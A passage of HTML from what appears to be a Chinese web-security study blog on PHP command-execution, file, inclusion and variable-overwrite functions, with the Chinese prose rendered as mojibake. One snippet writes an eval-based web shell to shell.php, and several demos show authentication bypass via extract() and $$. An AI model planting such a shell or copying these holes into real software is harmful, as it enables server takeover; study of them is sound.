class="comment"># é»˜è®¤æ— å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()å’Œåå¼•å·</span><br><span class="line"><span class="title function_ invoke__">popen</span>()ï¼Œ<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤æœ‰å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( å‘½ä»¤ï¼Œç»“æœæ•°ç»„ ï¼ŒçŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾ï¼Œè¦æƒ³è·å¾—ç»“æœï¼Œå°±è¦è¾“å‡ºç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„çŠ¶æ€ç ä¸º0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h2 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( å‘½ä»¤, çŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯æ‰§è¡Œäº†<code>sh -c &quot;command&quot;</code>å‘½ä»¤</p><p><strong>system()å‡½æ•°</strong>æ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( å‘½ä»¤, çŠ¶æ€ç   )</span><br></pre></td></tr></table></figure><p>å’Œ<strong>systemå‡½æ•°</strong>ç±»ä¼¼ï¼Œæ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="shell-exec-å’Œ-åå¼•å·"><a href="#shell-exec-å’Œ-åå¼•å·" class="headerlink" title="shell_exec()å’Œ åå¼•å·"></a><strong>shell_exec()å’Œ åå¼•å·</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( å‘½ä»¤ )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()å‡½æ•°</strong>é»˜è®¤æ— å›æ˜¾ï¼Œé€šè¿‡ <strong>echo</strong> å¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åæ’‡å· () æ“ä½œç¬¦çš„å˜ä½“ï¼Œå½“ç¦ç”¨shell_execæ—¶ï¼Œ&#96; ä¹Ÿä¸å¯æ‰§è¡Œ</strong></p><p>åå¼•å·åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>å‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œçš„å‘½ä»¤**<code>command</code><strong>ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æŒ‡é’ˆæ–‡ä»¶çš„è¿æ¥æ¨¡å¼</strong><code>mode</code>**ï¼Œæœ‰<code>r</code>å’Œ<code>w</code>ä»£è¡¨è¯»å’Œå†™ã€‚</p><p>å‡½æ•°ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proc-open-å‡½æ•°"><a href="#proc-open-å‡½æ•°" class="headerlink" title="proc_open()å‡½æ•°"></a>proc_open()å‡½æ•°</h2><p>ä¸<code>popen()</code>ç±»ä¼¼ï¼Œåªæ˜¯å¯ä»¥å¼€ä¸¤ä¸ªç®¡é“ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯ </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“ </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹ stream_get_contents â€” è¯»å–èµ„æºæµåˆ°ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="æ–‡ä»¶æ“ä½œå‡½æ•°"><a href="#æ–‡ä»¶æ“ä½œå‡½æ•°" class="headerlink" title="æ–‡ä»¶æ“ä½œå‡½æ•°"></a>æ–‡ä»¶æ“ä½œå‡½æ•°</h1><p><a href="https://www.php.net/manual/zh/ref.filesystem.php">https://www.php.net/manual/zh/ref.filesystem.php</a></p><h2 id="fopen-æ¨¡å¼"><a href="#fopen-æ¨¡å¼" class="headerlink" title="fopen() æ¨¡å¼"></a>fopen() æ¨¡å¼</h2><table><thead><tr><th align="left">:-</th><th>-</th></tr></thead><tbody><tr><td align="left"><code>r</code></td><td>è¯»</td></tr><tr><td align="left"><code>r+</code></td><td>è¯»å†™ï¼Œå‰ç½®</td></tr><tr><td align="left"><code>w</code></td><td>å†™å…¥ï¼Œæˆªæ–­</td></tr><tr><td align="left"><code>w+</code></td><td>è¯»å†™ï¼Œæˆªæ–­</td></tr><tr><td align="left"><code>a</code></td><td>å†™ï¼Œè¿½åŠ </td></tr><tr><td align="left"><code>a+</code></td><td>è¯»å†™ï¼Œè¿½åŠ </td></tr></tbody></table><h2 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;a&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="comment"># FILE_APPEND:æ•°æ®è¿½åŠ ï¼Œè€Œä¸æ˜¯è¦†ç›–</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,é»˜è®¤<span class="literal">false</span>)  <span class="literal">false</span>:æ‰ä¼šå°†å†…å®¹æ‰“å°å‡ºæ¥</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(filename)</span><br><span class="line">    </span><br><span class="line">å‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h2 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; has been deleted.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; does not exist.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å¤åˆ¶æ–‡ä»¶"><a href="#å¤åˆ¶æ–‡ä»¶" class="headerlink" title="å¤åˆ¶æ–‡ä»¶"></a>å¤åˆ¶æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(æºæ–‡ä»¶,ç›®çš„æ–‡ä»¶)</span><br></pre></td></tr></table></figure><h2 id="è¯»å–ç›®å½•"><a href="#è¯»å–ç›®å½•" class="headerlink" title="è¯»å–ç›®å½•"></a>è¯»å–ç›®å½•</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)ç­‰ä»·äº<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>)éƒ½æ˜¯å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">ä»¥æ•°ç»„çš„å½¢å¼è¿”å›</span><br></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•"><a href="#æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•" class="headerlink" title="æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•"></a>æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob() ç±»ä¼¼äºfind</span><br><span class="line">ä»¥æ•°ç»„çš„å½¢å¼è¿”å›</span><br></pre></td></tr></table></figure><p><img src="E:/blog/source/images/image-20220730140323897-1687422810163.png" alt="image-20220730140323897"></p><h1 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h1><ul><li><code>require()</code>:æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ</li><li><code>include()</code>:æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ</li><li><code>require_once()</code>ä¸<code>require()</code>ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</li><li><code>include_once()</code>ä¸<code>include()</code>ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</li></ul><h1 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h1><ul><li><p><code>extract()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?auth=true</span></span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auth</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;over&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>import_request_variables()</code>â€“php&lt;5.4.0</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIE</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>( <span class="string">&#x27;G&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># xx.php?auth=1</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private! &quot;</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public! &quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>$$</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span> &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;hello world hello world  <span class="comment"># $&#123;$a&#125;ç­‰åŒäº$hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­˜åœ¨å˜é‡è¦†ç›–Demo</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>parse_str(query,variabal)</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¨èç”¨æ³•</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸å»ºè®®è¿™ä¹ˆç”¨</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="ç”¨æˆ·ä¼ å‚"><a href="#ç”¨æˆ·ä¼ å‚" class="headerlink" title="ç”¨æˆ·ä¼ å‚"></a>ç”¨æˆ·ä¼ å‚</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span> </span><br><span class="line"><span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_COOKIE</span> </span><br><span class="line"><span class="variable">$_REQUEST</span> </span><br><span class="line"><span class="variable">$_FILES</span> </span><br><span class="line"><span class="variable">$_SERVER</span> </span><br><span class="line"><span class="variable">$GLOBALS</span></span><br></pre></td></tr></table></figure><h3 id="SERVER-xx"><a href="#SERVER-xx" class="headerlink" title="$_SERVER[xx]"></a>$_SERVER[xx]</h3><p>è·å–å½“å‰urlè·¯å¾„çš„å‡½æ•°åŠæœåŠ¡å™¨å˜é‡</p><p><a href="https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html">https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]ï¼šæŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>]ï¼šå½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure><h2 id="è·å–æ‰€æœ‰å˜é‡-x2F-å‡½æ•°-x2F-å¸¸é‡"><a href="#è·å–æ‰€æœ‰å˜é‡-x2F-å‡½æ•°-x2F-å¸¸é‡" class="headerlink" title="è·å–æ‰€æœ‰å˜é‡&#x2F;å‡½æ•°&#x2F;å¸¸é‡"></a>è·å–æ‰€æœ‰å˜é‡&#x2F;å‡½æ•°&#x2F;å¸¸é‡</h2><ul><li><a href="https://www.php.net/manual/zh/function.get-defined-functions.php"><strong>get_defined_functions</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-constants.php"><strong>get_defined_constants</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-vars.php"><strong>get_defined_vars</strong></a></li></ul><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="å¤§å°å†™"><a href="#å¤§å°å†™" class="headerlink" title="å¤§å°å†™"></a>å¤§å°å†™</h2><p>åœ¨ PHP ä¸­ï¼Œå…³é”®å­—ï¼ˆä¾‹å¦‚<code>if</code>ã€ <code>else</code>ã€<code>while</code>ã€ <code>echo</code>ç­‰ï¼‰ã€ç±»ã€å‡½æ•°å’Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ã€‚</p><p>ä½†æ˜¯æ‰€æœ‰å˜é‡åéƒ½åŒºåˆ†å¤§å°å†™ï¼</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ECHO <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line">EcHo <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;Hello World!</span><br></pre></td></tr></table></figure><h2 id="PHPæ¥æ”¶å‚æ•°"><a href="#PHPæ¥æ”¶å‚æ•°" class="headerlink" title="PHPæ¥æ”¶å‚æ•°"></a>PHPæ¥æ”¶å‚æ•°</h2><p><a href="https://blog.csdn.net/bylfsj/article/details/102770461">https://blog.csdn.net/bylfsj/article/details/102770461</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/120502141">https://y4tacker.blog.csdn.net/article/details/120502141</a></p><p><strong>PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š&#x2F;?foo&#x3D;barå˜æˆArray([foo] &#x3D;&gt; â€œbarâ€)</strong></p><p>phpä»è¯·æ±‚çš„urlä¸­å–å‡ºå‚æ•°å¹¶ä¿å­˜ä¹‹å‰ï¼Œå¯¹å‚æ•°åçš„æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.åˆ é™¤å‚æ•°åå‰çš„ä¸€äº›ç¬¦å·</span><br><span class="line">2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆå°è¯•å[å¥½åƒä¸èƒ½è¢«è§£æä¸º_ï¼‰</span><br><span class="line">3.åˆ é™¤å‚æ•°ååçš„ä¸€äº›ç¬¦å·</span><br></pre></td></tr></table></figure><p><img src="/../images/1567560448_5d6f13004035f.png" alt="img"></p><h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><p>PHP7ä»¥å‰çš„ç‰ˆæœ¬æ”¯æŒå°†å¤šè¿›åˆ¶çš„æ•°å€¼è½¬æ¢ï¼Œæ‰€ä»¥â€™1â€™&#x3D;&#x3D;â€™0x1â€™æ˜¯æˆç«‹çš„ï¼Œä½†æ–°ç‰ˆæœ¬æ˜¯falseã€‚</p><h3 id="x3D-x3D-ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰"><a href="#x3D-x3D-ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰" class="headerlink" title="&#x3D;&#x3D;ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰"></a>&#x3D;&#x3D;ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">å…¶ä»–æ•°å­—==True</span><br></pre></td></tr></table></figure><h4 id="æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—"><a href="#æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—" class="headerlink" title="æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—"></a>æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>) 